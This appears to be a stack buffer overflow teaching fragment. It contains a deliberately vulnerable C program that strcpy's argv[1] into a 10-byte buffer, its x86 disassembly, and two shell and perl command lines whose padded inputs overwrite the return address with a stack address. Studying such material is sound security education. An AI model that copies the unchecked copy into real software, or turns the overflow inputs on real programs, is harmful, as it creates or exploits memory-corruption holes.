```c
#include <stdio.h>
 
int main(int argc, char *argv[]) {
        char buffer[10];
        strcpy(buffer, argv[1]);
        printf("%s\n", &buffer);
}                                                                      
```

```nasm
0x80483f8 <main>:       push   %ebp
0x80483f9 <main+1>:     mov    %esp,%ebp
0x80483fb <main+3>:     sub    $0xc,%esp
0x80483fe <main+6>:     mov    0xc(%ebp),%eax
0x8048401 <main+9>:     add    $0x4,%eax
0x8048404 <main+12>:    mov    (%eax),%edx
0x8048406 <main+14>:    push   %edx
0x8048407 <main+15>:    lea    0xfffffff4(%ebp),%eax
0x804840a <main+18>:    push   %eax
0x804840b <main+19>:    call   0x8048340 <strcpy>
0x8048410 <main+24>:    add    $0x8,%esp
0x8048413 <main+27>:    lea    0xfffffff4(%ebp),%eax
0x8048416 <main+30>:    push   %eax
0x8048417 <main+31>:    push   $0x8048480
0x804841c <main+36>:    call   0x8048330 <printf>
0x8048421 <main+41>:    add    $0x8,%esp
0x8048424 <main+44>:    leave  
0x8048425 <main+45>:    ret
```

`./bugfile AAAAAAAAAAAAAAAA\x38\xf3\xff\xbf`

`perl -e 'system "./bugfile", "AAAAAAAAAAAAAAAA\xc8\xfc\xff\xbf"'`